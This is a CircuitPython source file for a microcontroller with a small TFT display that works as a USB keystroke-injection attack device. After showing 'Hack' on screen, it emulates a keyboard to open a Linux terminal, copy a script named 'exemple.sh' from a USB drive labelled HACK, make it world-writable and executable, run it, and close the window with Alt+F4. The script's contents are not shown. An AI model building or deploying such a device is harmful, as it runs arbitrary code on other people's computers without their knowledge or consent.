import time
import board
import usb_hid
import digitalio
import busio
import terminalio
import displayio
from adafruit_display_text import label
from adafruit_st7789 import ST7789
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Declare some parameters used to adjust style of text and graphics
BORDER = 0
FONTSCALE = 3
BACKGROUND_COLOR = 000000
FOREGROUND_COLOR = 000000
TEXT_COLOR = 999999

# Release any resources currently in use for the displays
displayio.release_displays()

tft_clk = board.GP10  # must be a SPI CLK
tft_mosi = board.GP11  # must be a SPI TX
tft_rst = board.GP12
tft_dc = board.GP8
tft_cs = board.GP9
spi = busio.SPI(clock=tft_clk, MOSI=tft_mosi)

# Make the displayio SPI bus and the GC9A01 display
display_bus = displayio.FourWire(spi, command=tft_dc, chip_select=tft_cs, reset=tft_rst)
display = ST7789(display_bus, rotation=270, width=240, height=135, rowstart=40, colstart=53)

# Make the display context
splash = displayio.Group()
display.show(splash)

color_bitmap = displayio.Bitmap(display.width, display.height, 1)
color_palette = displayio.Palette(1)
color_palette[0] = BACKGROUND_COLOR

# This section switch On the backlight of TFT
tft_bl = board.GP13
led = digitalio.DigitalInOut(tft_bl)
led.direction = digitalio.Direction.OUTPUT
led.value = True

bg_sprite = displayio.TileGrid(color_bitmap, pixel_shader=color_palette, x=0, y=0)
splash.append(bg_sprite)

# This function creates colorful rectangular box
def inner_rectangle():
    # Draw a smaller inner rectangle
    inner_bitmap = displayio.Bitmap(display.width - BORDER * 2, display.height - BORDER * 2, 1)
    inner_palette = displayio.Palette(1)
    inner_palette[0] = FOREGROUND_COLOR
    inner_sprite = displayio.TileGrid(inner_bitmap, pixel_shader=inner_palette, x=BORDER, y=BORDER)
    splash.append(inner_sprite)

# Function to print data on TFT
def print_onTFT(text, x_pos, y_pos):
    text_area = label.Label(terminalio.FONT, text=text, color=TEXT_COLOR)
    text_group = displayio.Group(scale=FONTSCALE, x=x_pos, y=y_pos)
    text_group.append(text_area)  # Subgroup for text scaling
    splash.append(text_group)

try:
    inner_rectangle()
    print_onTFT("Hack", 20, 60)
    
    path = "exemple.sh"
    
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
    time.sleep(0.6)
    
    keyboard_layout.write("cp ..")
    keyboard.send(Keycode.TAB)
    keyboard_layout.write("..")
    keyboard.send(Keycode.TAB)
    keyboard_layout.write("media")
    keyboard.send(Keycode.TAB)
    keyboard.send(Keycode.TAB)
    keyboard_layout.write("HACK")
    keyboard.send(Keycode.TAB)
    keyboard_layout.write(f"{path} ..")
    keyboard.send(Keycode.TAB)
    keyboard.send(Keycode.TAB)
    keyboard.send(Keycode.ENTER)
    time.sleep(0.6)
    
    keyboard_layout.write(f"chmod 777 {path}")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.6)
    
    keyboard_layout.write(".")
    keyboard.send(Keycode.TAB)
    keyboard_layout.write(f"{path}")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.6)
    
    keyboard.send(Keycode.ALT, Keycode.F4)
    
except Exception as ex:
    keyboard.release_all()
    raise ex
